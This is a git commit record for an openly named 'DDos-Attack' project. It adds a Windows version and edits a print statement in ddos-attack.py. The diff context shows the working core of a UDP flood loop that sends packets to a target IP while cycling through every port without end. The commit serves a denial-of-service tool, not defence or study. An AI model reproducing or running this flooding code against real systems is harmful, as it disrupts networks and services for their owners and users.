4c1237a6c44fd58aab1b7c3ebc0930bccd59eadc
Zuorong Zhang <zuorong-zhang@outlook.com>
2020-08-07 22:50:38 +0800

    Improved README.md, create DDos-Attack Windows version.
    README.md: Improved.
    ddos-attack-windows.py: DDos-Attack for Windows.
    
    Signed-off-by: Zuorong Zhang <zuorong-zhang@outlook.com>

--- ddos-attack.py
+++ ddos-attack.py
@@ -45,7 +45,7 @@ while True:
      sock.sendto(bytes, (ip,port))
      sent = sent + 1
      port = port + 1
-     print "Sent %s packet to %s throught port:%s"%(sent,ip,port)
+     print "Sent %s packet to %s throught port:%s."%(sent,ip,port)
      if port == 65534:
        port = 1
 
